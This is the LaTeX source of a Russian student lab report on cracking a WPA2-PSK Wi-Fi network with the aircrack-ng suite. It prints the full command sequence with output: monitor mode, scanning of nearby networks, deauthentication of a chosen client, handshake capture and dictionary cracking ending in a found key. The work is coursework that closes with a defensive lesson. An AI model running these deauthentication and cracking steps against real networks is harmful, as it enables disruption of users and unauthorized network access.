\documentclass[10pt,a4paper]{report}
\usepackage[utf8]{inputenc}
\usepackage[russian]{babel}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{listings}

\usepackage[left=1.8cm, right=1cm, top=0.8cm, bottom=2cm, 
bindingoffset=0cm]{geometry}

\author{Климов Сергей}
\title{Лабораторная работа №6.\\
	AirCrack}
\begin{document}
	\maketitle
	\renewcommand{\thesection}{\arabic{section}}
	\tableofcontents
	\pagebreak
	
	\setcounter{totalnumber}{10}
	\setcounter{topnumber}{10}
	\setcounter{bottomnumber}{10}
	\renewcommand{\topfraction}{1}
	\renewcommand{\textfraction}{0}
	
	\section{Цель работы}
		Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2 PSK и WEP.
	\section{Изучение пакета Aircrack}
		\subsection{Описание основных утилит}
			\begin{itemize}
				\item Airodump-ng - утилита, предназначенная для захвата пакетов протокола 802.11.
				\item Aireplay-ng - утилита, для генерации трафика, необходимого для взлома при помощи утилиты aircrack-ng.
				\item Aircrack-ng - утилита для взлома ключей WEP и WPA при помощи перебора по словарю.
			\end{itemize}
		\subsection{Запуск режима мониторинга на бестроводном интерфейсе}
			\begin{lstlisting}
root@kali:~# airmon-ng start wlan0

Found 4 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

  PID Name
 1318 NetworkManager
 1407 wpa_supplicant
 1519 dhclient
 2387 dhclient

PHY	Interface	Driver		Chipset

phy0	wlan0		iwlwifi		Intel Corporation Wireless 7260 (rev 73)
			\end{lstlisting}
		\subsection{Запустить утилиту airodump и изучить форматы вывода этой утилиты}
		При запуске утилиты с ключем --write создается набор файлов с указанным префиксом. Файлы в формате csv и xmlсодержат в себе информацию о доступных сетях. 
Еще два фала содержат информацию о перехваченных пакетах. Файл типа .cap содержит перехваченные пакеты, а csv - файл содержит лишь сокращенную информацию.
	\section{Практическое задание}
		Запустим режим мониторинга на беспроводном интерфейсе
		\begin{lstlisting}
root@kali:~# airodump-ng wlan0mon

 CH 13 ][ Elapsed: 18 s ][ 2016-05-28 17:07                                    
                                                                               
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                               
 10:7B:EF:60:45:8C  -87        0        0    0   3  54e  WPA2 CCMP   PSK  Sasha
 6C:19:8F:CC:01:90  -53       50        0    0   1  54e  WPA2 CCMP   PSK  HomeW
 C4:6E:1F:7A:62:78  -64       36        0    0   6  54e. WPA2 CCMP   PSK  TP-LI
 D4:21:22:35:2A:22  -65       29        0    0   1  54e  WPA2 CCMP   PSK  Smart
 54:04:A6:5B:41:A8  -74       19        0    0   1  54e  WPA2 CCMP   PSK  Inter
 DC:9F:DB:08:05:7C  -78        8        0    0  31  54e. WPA2 CCMP   PSK  <leng
 DC:9F:DB:08:03:D1  -79       19        5    0   4  54e. WPA2 CCMP   PSK  zet-1
 00:14:D1:BD:F7:F4  -82       15        0    0  11  54e  WPA2 TKIP   PSK  kolia 
 C0:4A:00:E2:D5:38  -84       11        0    0   6  54e. WPA2 CCMP   PSK  TP-LI 
 34:4D:EB:EA:DC:07  -85       17        0    0  13  54e. WPA2 CCMP   PSK  WiFi-
 B8:A3:86:AB:96:1E  -86       12        0    0   1  54e  WPA  TKIP   PSK  beeli
 90:F6:52:2F:5C:C2  -87       11        0    0   6  54e. WPA2 CCMP   PSK  polus                    
                                               
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                            
                                                  
 D8:5D:4C:DA:F8:2E  FC:F8:AE:DA:5D:18  -55   24 - 5      0     3872                                                                   
 60:A4:4C:3B:80:20  80:56:F2:E0:3D:61  -77    1e- 1e   449      408     
		\end{lstlisting}
		
		Целевая сеть:
		\begin{lstlisting}
 6C:19:8F:CC:01:90  -52      103        0    0   1  54e  WPA2 CCMP   PSK  HomeWiFi 
		\end{lstlisting}
		Запустим сбор трафика для получения аутентификационных сообщений:
		\begin{lstlisting}
root@kali:~# airodump-ng wlan0mon --write airdump --bssid 6C:19:8F:CC:01:90 -c 1
 CH  1 ][ Elapsed: 1 min ][ 2016-05-28 17:11                                         
                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                       
 6C:19:8F:CC:01:90  -39 100      810        8    0   1  54e  WPA2 CCMP   PSK  HomeWiFi 
                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe             
                                                                                       
 6C:19:8F:CC:01:90  98:F1:70:93:04:63  -28    0 -24e     0      103                     
 6C:19:8F:CC:01:90  D8:50:E6:91:D8:1C  -60    0e- 6      0       24    
		\end{lstlisting}
		Произведем деаутентификацию одного из клиентов (клиента с MAC-адресом 
		D8:50:E6:91:D8:1C), до тех пор, пока не удастся собрать необходимых для 
		взлома аутентификационных сообщений.
\begin{lstlisting}
root@kali:~# sudo aireplay-ng --ignore-negative-one --deauth 150 -a 6C:19:8F:CC:01:90 -h D8:50:E6:91:D8:1C wlan0mon
17:14:07  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:07  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:07  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:17  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:27  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:28  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:38  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:38  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:48  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]
17:14:49  Sending DeAuth to broadcast -- BSSID: [6C:19:8F:CC:01:90]

\end{lstlisting}
В результате перехватываем пакет handshake:
\begin{lstlisting}
root@kali:~# airodump-ng wlan0mon --bssid 6C:19:8F:CC:01:90 -c 1 --write dump --ignore-negative-one
 CH  1 ][ Elapsed: 1 min ][ 2016-05-21 13:28 ][ WPA handshake: 6C:19:8F:CC:01:90
                                             
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                               
 6C:19:8F:CC:01:90  -35 100      623     5574  166   5  54 . WPA2 CCMP   PSK  room421                                                
                                              
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                           
                                             
 D8:5D:4C:DA:F8:2E  D8:E5:6D:94:90:46  -49   54 - 6      0      126  HomeWiFi                                                          
 D8:5D:4C:DA:F8:2E  FC:F8:AE:DA:5D:18  -51   54 -48      3     5129         
\end{lstlisting}
Произведем взлом используя словарь паролей.
Для того, что бы взлом происходил быстрее, создадим свой словарь паролей 
(dictionary.dic).
\begin{lstlisting}
root@kali:~# aircrack-ng dump-01.cap -w dictionary.dic 
Opening dump-01.cap
Read 33260 packets.

   #  BSSID              ESSID                     Encryption

   1  6C:19:8F:CC:01:90  HomeWiFi                   WPA (1 handshake)

Choosing first network as target.

Opening dump-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 beta3


                   [00:00:00] 1 keys tested (358.84 k/s)


                         KEY FOUND! [ ********* ]


      Master Key     : F9 C3 60 85 42 26 AB 6E 15 80 8D 73 A7 1A 76 63 
                       45 FC B0 FD A5 FD 58 24 8A CB 80 38 3C 21 C6 BA 

      Transient Key  : 49 13 7A 7D CF E4 00 FC AA 8C DB 8A 58 AC 7F DF 
                       D5 FF 15 6A AC 4D D2 D1 F7 B4 02 69 37 F7 22 AE 
                       4B E7 B3 53 B9 53 24 18 49 48 56 6B 1C BB 1A FE 
                       C4 BA 3A 08 E5 98 6D 96 AF 25 64 0B 25 D4 03 A9 

      EAPOL HMAC     : 7D 59 5E 9F AE 1B 7A 1D B5 F6 3A 75 75 51 C2 76 

\end{lstlisting}
В результате видим сообщение об успешно подобранном пароле, а так же сам пароль.

\section{Выводы}
В ходе данной работы были изучены основные возможности пакета AirCrack и 
принципы взлома WPA/WPA2 PSK. %
Данный инструмент позволяет прослушивать пакеты, генерировать новые и на основе 
handshake, а так же осуществлять взлом пароля сети при помощи перебора по 
словарю, что в реальных ситуациях очень ресурсозатратно. %
Заметим, что деаутентификация клиента не требует особых затрат, 
что может быть использовано в ряде атак. %
В ходе работы было выяснено, что для защиты сети не стоит использовать простые 
пароли, которые могут содержаться в различных словарях.
\end{document}